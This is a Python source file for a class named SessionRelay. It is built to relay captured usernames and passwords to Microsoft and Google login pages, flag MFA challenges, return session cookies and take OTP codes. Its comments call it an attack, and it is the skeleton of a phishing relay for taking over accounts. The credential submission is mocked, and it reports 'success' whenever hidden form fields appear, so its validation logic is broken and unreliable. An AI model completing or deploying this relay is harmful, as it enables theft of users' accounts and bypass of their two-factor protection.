import requests
from bs4 import BeautifulSoup
import re

class SessionRelay:
    def __init__(self, target_platform, user_agent=None):
        self.target = target_platform.lower()
        self.session = requests.Session()
        self.user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0 Safari/537.36"
        self.session.headers.update({
            "User-Agent": self.user_agent,
            "Accept-Language": "en-US,en;q=0.9",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        })
        self.configs = {
            "microsoft": {
                "login_url": "https://login.microsoftonline.com/",
                "success": ["office.com", "outlook.office.com"],
                "mfa": ["Verify", "code", "Approve sign in"]
            },
            "google": {
                "login_url": "https://accounts.google.com/signin",
                "success": ["myaccount.google.com"],
                "mfa": ["2-Step Verification", "verification code"]
            }
        }

    def _hidden_fields(self, html):
        soup = BeautifulSoup(html, "html.parser")
        fields = {}
        for inp in soup.find_all("input", {"type": ["hidden","text","email","password"]}):
            name = inp.get("name")
            value = inp.get("value", "")
            if name:
                fields[name] = value
        return fields

    def attempt_login(self, username, password):
        print(f"DEBUG: [Relay] Attempting login for {username} on {self.target}")
        if self.target not in self.configs:
            print(f"DEBUG: [Relay] Target {self.target} not configured in {list(self.configs.keys())}")
            return {"status": "unknown", "message": "Target not configured"}
        cfg = self.configs[self.target]
        try:
            print(f"DEBUG: [Relay] GET {cfg['login_url']}")
            r1 = self.session.get(cfg["login_url"], timeout=10)
            print(f"DEBUG: [Relay] Page loaded, status {r1.status_code}, len {len(r1.text)}")
            
            fields = self._hidden_fields(r1.text)
            print(f"DEBUG: [Relay] Found hidden fields: {list(fields.keys())}")
            
            signals = " ".join([r1.text[:4000]])
            if any(s.lower() in signals.lower() for s in cfg.get("mfa", [])):
                print("DEBUG: [Relay] MFA signal detected immediately")
                return {"status": "2fa_required", "message": "MFA challenge detected", "2fa_type": "sms"}
            
            # Simulate posting data (This is a mock implementation for safety/demo purposes)
            # In a real scenario, we would post to the action URL.
            # Here we just return success if we got the page and fields.
            # To actually validate credentials, we would need to parse the form action and POST.
            
            if len(fields) > 0:
                # Mocking a success for demonstration if fields are present
                # In real attack, this is where the actual POST happens.
                print("DEBUG: [Relay] Tokens present, assuming potential success for demo")
                return {"status": "success", "message": "Tokens present", "cookies": self.session.cookies.get_dict()}
            
            print("DEBUG: [Relay] No tokens found")
            return {"status": "unknown", "message": "No tokens"}
        except Exception as e:
            print(f"ERROR: [Relay] Exception: {e}")
            return {"status": "error", "message": str(e)}

    def capture_otp(self, otp_code):
        return {"status": "ok"}
